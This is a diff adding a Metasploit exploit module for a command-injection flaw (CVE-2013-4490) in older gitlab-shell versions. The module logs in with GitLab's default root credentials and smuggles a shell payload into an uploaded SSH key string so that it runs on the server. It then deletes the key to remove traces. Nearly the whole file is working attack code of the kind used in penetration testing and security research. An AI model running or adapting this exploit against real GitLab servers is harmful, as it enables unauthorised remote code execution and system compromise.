@@ -1,0 +1,238 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'net/ssh'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Gitlab-shell Code Execution',
+      'Description'    => %q(
+        This module takes advantage of the addition of authorized
+        ssh keys in the gitlab-shell functionality of Gitlab. Versions
+        of gitlab-shell prior to 1.7.4 used the ssh key provided directly
+        in a system call resulting in a command injection vulnerability. As
+        this relies on adding an ssh key to an account valid credentials
+        are required to exploit this vulnerability.
+      ),
+      'Author'  =>
+        [
+          'Brandon Knight'
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['URL', 'https://about.gitlab.com/2013/11/04/gitlab-ce-6-2-and-5-4-security-release/'],
+          ['CVE', '2013-4490']
+        ],
+      'Platform'  => 'linux',
+      'Targets'        =>
+        [
+          [ 'Linux',
+            {
+              'Platform' => 'linux',
+              'Arch' => ARCH_X86
+            }
+          ],
+          [ 'Linux (x64)',
+            {
+              'Platform' => 'linux',
+              'Arch' => ARCH_X86_64
+            }
+          ],
+          [ 'Unix (CMD)',
+            {
+              'Platform' => 'unix',
+              'Arch' => ARCH_CMD,
+              'Payload' =>
+                {
+                  'Compat'      =>
+                    {
+                      'RequiredCmd' => 'openssl perl python'
+                    },
+                  'BadChars' => "\x22"
+                }
+            }
+          ],
+          [ 'Python',
+            {
+              'Platform' => 'python',
+              'Arch' => ARCH_PYTHON,
+              'Payload' =>
+                {
+                  'BadChars' => "\x22"
+                }
+            }
+          ]
+        ],
+      'CmdStagerFlavor' => %w( bourne printf ),
+      'DisclosureDate' => 'Nov 4 2013',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('USERNAME',  [true, 'The username to authenticate as', 'root']),
+        OptString.new('PASSWORD',  [true, 'The password for the specified username', '5iveL!fe']),
+        OptString.new('TARGETURI', [true,  'The path to Gitlab', '/'])
+      ], self.class)
+  end
+
+  def exploit
+    login
+    case target['Platform']
+    when 'unix'
+      execute_command(payload.encoded)
+    when 'python'
+      execute_command("python -c \\\"#{payload.encoded}\\\"")
+    when 'linux'
+      execute_cmdstager(temp: './', linemax: 2800)
+    end
+  end
+
+  def execute_command(cmd, _opts = {})
+    key_id = add_key(cmd)
+    delete_key(key_id)
+  end
+
+  def check
+    res = send_request_cgi('uri' => normalize_uri(target_uri.path.to_s, 'users', 'sign_in'))
+    if res && res.body && res.body.include?('GitLab')
+      return Exploit::CheckCode::Detected
+    else
+      return Exploit::CheckCode::Unknown
+    end
+  end
+
+  def login
+    username = datastore['USERNAME']
+    password = datastore['PASSWORD']
+    signin_page = normalize_uri(target_uri.path.to_s, 'users', 'sign_in')
+
+    # Get a valid session cookie and authenticity_token for the next step
+    res = send_request_cgi(
+                            'method' => 'GET',
+                            'cookie' => 'request_method=GET',
+                            'uri'    => signin_page
+    )
+
+    fail_with(Failure::TimeoutExpired, "#{peer} - Connection timed out during login") unless res
+
+    local_session_cookie = res.get_cookies.scan(/(_gitlab_session=[A-Za-z0-9%-]+)/).flatten[0]
+    auth_token = res.body.scan(/<input name="authenticity_token" type="hidden" value="(.*?)"/).flatten[0]
+
+    if res.body.include? 'user[email]'
+      @gitlab_version = 5
+      user_field = 'user[email]'
+    else
+      @gitlab_version = 7
+      user_field = 'user[login]'
+    end
+
+    # Perform the actual login and get the newly assigned session cookie
+    res = send_request_cgi(
+                            'method' => 'POST',
+                            'cookie' => local_session_cookie,
+                            'uri'    => signin_page,
+                            'vars_post' =>
+                              {
+                                'utf8' => "\xE2\x9C\x93",
+                                'authenticity_token' => auth_token,
+                                "#{user_field}" => username,
+                                'user[password]' => password,
+                                'user[remember_me]' => 0
+                              }
+                          )
+
+    fail_with(Failure::NoAccess, "#{peer} - Login failed") unless res && res.code == 302
+
+    @session_cookie = res.get_cookies.scan(/(_gitlab_session=[A-Za-z0-9%-]+)/).flatten[0]
+
+    fail_with(Failure::NoAccess, "#{peer} - Unable to get session cookie") if @session_cookie.nil?
+  end
+
+  def add_key(cmd)
+    if @gitlab_version == 5
+      @key_base = normalize_uri(target_uri.path.to_s, 'keys')
+    else
+      @key_base = normalize_uri(target_uri.path.to_s, 'profile', 'keys')
+    end
+
+    # Perform an initial request to get an authenticity_token so the actual
+    # key addition can be done successfully.
+    res = send_request_cgi(
+                            'method' => 'GET',
+                            'cookie' => "request_method=GET; #{@session_cookie}",
+                            'uri'    => normalize_uri(@key_base, 'new')
+    )
+
+    fail_with(Failure::TimeoutExpired, "#{peer} - Connection timed out during request") unless res
+
+    auth_token = res.body.scan(/<input name="authenticity_token" type="hidden" value="(.*?)"/).flatten[0]
+    title = rand_text_alphanumeric(16)
+    key_info = rand_text_alphanumeric(6)
+
+    # Generate a random ssh key
+    key = OpenSSL::PKey::RSA.new 2048
+    type = key.ssh_type
+    data = [key.to_blob].pack('m0')
+
+    openssh_format = "#{type} #{data}"
+
+    # Place the payload in to the key information to perform the command injection
+    key = "#{openssh_format} #{key_info}';#{cmd}; echo '"
+
+    res = send_request_cgi(
+                            'method' => 'POST',
+                            'cookie' => "request_method=GET; #{@session_cookie}",
+                            'uri'    => @key_base,
+                            'vars_post' =>
+                              {
+                                'utf8' => "\xE2\x9C\x93",
+                                'authenticity_token' => auth_token,
+                                'key[title]' => title,
+                                'key[key]' => key
+                              }
+                          )
+
+    fail_with(Failure::TimeoutExpired, "#{peer} - Connection timed out during request") unless res
+
+    # Get the newly added key id so it can be used for cleanup
+    key_id = res.headers['Location'].split('/')[-1]
+
+    key_id
+  end
+
+  def delete_key(key_id)
+    res = send_request_cgi(
+                             'method' => 'GET',
+                             'cookie' => "request_method=GET; #{@session_cookie}",
+                             'uri'    => @key_base
+                           )
+
+    fail_with(Failure::TimeoutExpired, "#{peer} - Connection timed out during request") unless res
+
+    auth_token = res.body.scan(/<meta content="(.*?)" name="csrf-token"/).flatten[0]
+
+    # Remove the key which was added to clean up after ourselves
+    res = send_request_cgi(
+                             'method' => 'POST',
+                             'cookie' => "#{@session_cookie}",
+                             'uri'    => normalize_uri("#{@key_base}", "#{key_id}"),
+                             'vars_post' =>
+                             {
+                               '_method' => 'delete',
+                               'authenticity_token' => auth_token
+                             }
+                           )
+
+    fail_with(Failure::TimeoutExpired, "#{peer} - Connection timed out during request") unless res
+  end
+end
